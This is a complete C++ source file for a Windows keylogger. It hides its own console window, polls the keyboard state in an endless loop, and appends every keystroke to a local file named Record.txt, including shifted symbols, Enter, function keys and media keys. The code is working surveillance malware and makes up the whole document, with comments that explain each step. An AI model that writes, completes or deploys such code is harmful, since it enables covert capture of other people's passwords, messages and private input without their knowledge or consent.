#include <iostream>
#include <windows.h>
#include <winuser.h>
#include <fstream>

// Function prototypes
void KeyLogger(void);
void hide_exe();

// main function
int main(void)
{
    hide_exe();
    KeyLogger();
}

// funtion to capture the keystrokes
void KeyLogger(void)
{
    char character;

    while (true) // used for infinite loop
    {
        for (character = 8; character <= 222; character++)
        {
            /*
                 The range 8 to 222 covers a wide range of keys including:

                   - Numeric keys (0-9)
                   - Alphabet keys (A-Z)
                   - Function keys (F1-F12)
                   - Control keys (Shift, Ctrl, Alt, etc.)
                   - Punctuation keys and other special characters.

            */
            /*
                When a key is pressed there is a system interrupt
                That interrupt can represent the number
                i.e.; 32767
            */
            if (GetAsyncKeyState(character) == -32767)
            {
                // GetAsyncKeyState checks if a specific key was pressed.
                // -32767 indicates a key press event.
                std::ofstream write("Record.txt", std::ios::app); // ios::app ensures that the file is opened in append mode.

                if (character > 64 && character < 91 && !GetAsyncKeyState(0x10))
                {
                    // 0x10 is the hexadecimal notation for the "Shift" key
                    character += 32;
                    write << character;
                }

                else if (character > 64 && character < 91)
                {
                    write << character;
                }

                switch (character)
                {
                    case 39:
                    {
                        if (GetAsyncKeyState(0x10))
                        {
                            write << """";
                        }
                        else
                        {
                            write << character;
                        }
                        break;
                    }
                    case 44:
                    {
                        if (GetAsyncKeyState(0x10))
                        {
                            write << "<";
                        }
                        else
                        {
                            write << character;
                        }
                        break;
                    }
                    case 45:
                    {
                        if (GetAsyncKeyState(0x10))
                        {
                            write << "_";
                        }
                        else
                        {
                            write << character;
                        }
                        break;
                    }
                    case 46:
                    {
                        if (GetAsyncKeyState(0x10))
                        {
                            write << ">";
                        }
                        else
                        {
                            write << character;
                        }
                        break;
                    }
                    case 47:
                    {
                        if (GetAsyncKeyState(0x10))
                        {
                            write << "?";
                        }
                        else
                        {
                            write << character;
                        }
                        break;
                    }
                    case 48:
                    {
                        if (GetAsyncKeyState(0x10))
                        {
                            write << ")";
                        }
                        else
                        {
                            write << character;
                        }
                        break;
                    }
                    case 49:
                    {
                        if (GetAsyncKeyState(0x10))
                        {
                            write << "!";
                        }
                        else
                        {
                            write << character;
                        }
                        break;
                    }
                    case 50:
                    {
                        if (GetAsyncKeyState(0x10))
                        {
                            write << "@";
                        }
                        else
                        {
                            write << character;
                        }
                        break;
                    }
                    case 51:
                    {
                        if (GetAsyncKeyState(0x10))
                        {
                            write << "#";
                        }
                        else
                        {
                            write << character;
                        }
                        break;
                    }
                    case 52:
                    {
                        if (GetAsyncKeyState(0x10))
                        {
                            write << "$";
                        }
                        else
                        {
                            write << character;
                        }
                        break;
                    }
                    case 53:
                    {
                        if (GetAsyncKeyState(0x10))
                        {
                            write << "%";
                        }
                        else
                        {
                            write << character;
                        }
                        break;
                    }
                    case 54:
                    {
                        if (GetAsyncKeyState(0x10))
                        {
                            write << "^";
                        }
                        else
                        {
                            write << character;
                        }
                        break;
                    }
                    case 55:
                    {
                        if (GetAsyncKeyState(0x10))
                        {
                            write << "&";
                        }
                        else
                        {
                            write << character;
                        }
                        break;
                    }
                    case 56:
                    {
                        if (GetAsyncKeyState(0x10))
                        {
                            write << "*";
                        }
                        else
                        {
                            write << character;
                        }
                        break;
                    }
                    case 57:
                    {
                        if (GetAsyncKeyState(0x10))
                        {
                            write << "(";
                        }
                        else
                        {
                            write << character;
                        }
                        break;
                    }
                    case 59:
                    {
                        if (GetAsyncKeyState(0x10))
                        {
                            write << ":";
                        }
                        else
                        {
                            write << character;
                        }
                        break;
                    }
                    case 61:
                    {
                        if (GetAsyncKeyState(0x10))
                        {
                            write << "+";
                        }
                        else
                        {
                            write << character;
                        }
                        break;
                    }
                    case 91:
                    {
                        if (GetAsyncKeyState(0x10))
                        {
                            write << "{";
                        }
                        else
                        {
                            write << character;
                        }
                        break;
                    }
                    case 92:
                    {
                        if (GetAsyncKeyState(0x10))
                        {
                            write << "|";
                        }
                        else
                        {
                            write << character;
                        }
                        break;
                    }
                    case 93:
                    {
                        if (GetAsyncKeyState(0x10))
                        {
                            write << "}";
                        }
                        else
                        {
                            write << character;
                        }
                        break;
                    }
                    case 96:
                    {
                        if (GetAsyncKeyState(0x10))
                        {
                            write << "~";
                        }
                        else
                        {
                            write << character;
                        }
                        break;
                    }
                    case 8: // 8 means backspace.
                    {
                        write << "\b";
                    }
                    break;
                    case VK_RETURN: // ENTER key
                    {
                        write << " <Enter> " << std::endl;
                    }
                    break;
                    case 27: // 27 is for the "Escape key"
                    {
                        write << " <ESC> ";
                    }
                    break;
                    case 32: // 32 is for the "Space key"
                    {
                        write << " ";
                    }
                    break;
                    case 127: // 127 is for the "Delete key"
                    {
                        write << " <Delete> ";
                    }
                    break;
                    case VK_TAB: // for the tab key.
                    {
                        write << "\t";
                    }
                    break;

                    // Function key     
                    case VK_F1: // F1 key
                    {
                        write << "<F1> ";
                    }
                    break;
                    case VK_F2: // F2 key
                    {
                        write << "<F2> ";
                    }
                    break;
                    case VK_F3 : // F3 key
                    {
                        write << "<F3> ";
                    }
                    break;
                    case VK_F4: // F4 key
                    {
                        write<<"<F4> ";
                    }
                    break;
                    case VK_F5: // F5 key
                    {
                        write << "<F5> ";
                    }
                    break;
                    case VK_F6:  // F6 key
                    {
                        write << "<F6> ";
                    }
                    break;
                    case VK_F7: // F7 key
                    {
                        write << "<F7> ";
                    }
                    break;
                    case VK_F8: // F8 key
                    {
                        write << "<F8> ";
                    }
                    break;
                    case VK_F9:	// F9 key
                    {
                        write << "<F9> ";
                    }
                    break;
                    case VK_F10:	// F10 key
                    {
                        write << "<F10> ";
                    }
                    break;
                    case VK_F11	: // F11 key
                    {
                        write << "<F11> ";
                    }
                    break;
                    case VK_F12	: // F12 key
                    {
                        write << "<F12> ";
                    }
                    break;
                    case VK_F13	: // F13 key
                    {
                        write << "<F13> ";
                    }
                    break;
                    case VK_F14	: // F14 key
                    {
                        write << "<F14> ";
                    }
                    break;
                    case VK_F15	: // F15 key
                    {
                        write << "<F15> ";
                    }
                    break;
                    case VK_F17	: // F17 key
                    {
                        write << "<F17> ";
                    }
                    break;
                    case VK_F18	: // F18 key
                    {
                        write << "<F18> ";
                    }
                    break;
                    case VK_F19	: // F19 key
                    {
                        write << "<F19> ";
                    }
                    break;
                    case VK_F20	: // F120 key
                    {
                        write << "<F20> ";
                    }
                    break;
                    case VK_F21	: // F21 key
                    {
                        write << "<F21> ";
                    }
                    break;
                    case VK_F22	: // F22 key
                    {
                        write << "<F22> ";
                    }
                    break;
                    case VK_F23	: // F23 key
                    {
                        write << "<F23> ";
                    }
                    break;
                    case VK_F24	: // F24 key
                    {
                        write << "<F24> ";
                    }
                    break;
                    case VK_NUMLOCK	: // NUM LOCK key
                    {
                        write <<"<NUM LOCK key> ";
                    }
                    break;

                    // Volume buttons
                    case VK_VOLUME_MUTE: // Volume Mute key
                    {
                        write <<std::endl<<"<Volume Mute key> "<<std::endl;
                    }
                    break;
                    case VK_VOLUME_DOWN: // Volume Down key
                    {
                        write<<std::endl<<"<Volume Down key> "<<std::endl;
                    }
                    break;
                    case VK_VOLUME_UP: // Volume Up key
                    {
                        write<<std::endl<<"<Volume Up key> "<<std::endl;
                    }
                    break;

                    // Media Player buttons 
                    case VK_MEDIA_NEXT_TRACK: // Next Track key
                    {
                        write <<std::endl << "<Next Track key> "<<std::endl;
                    }
                    break;
                    case VK_MEDIA_PREV_TRACK :// Previous Track key
                    {
                        write << std::endl << "<Previous Track key> "<<std::endl;
                    }
                    break;
                    case VK_MEDIA_STOP:	// Stop Media key
                    {
                        write <<std::endl << "<Stop Media key> "<<std::endl;
                    }
                    break;
                    case VK_MEDIA_PLAY_PAUSE:	// Play/Pause Media key
                    {
                        write <<std::endl << "<Play/Pause Media key> "<<std::endl;
                    }
                    break;
                }
            }
        }
    }
}


// function to hide the exe file.
void hide_exe()
{
    HWND stealth; // handler named 'stealth'
    AllocConsole();
    stealth=FindWindowA("ConsoleWindowClass",NULL);
    ShowWindow(stealth,0); // '0' means not to show the window.
}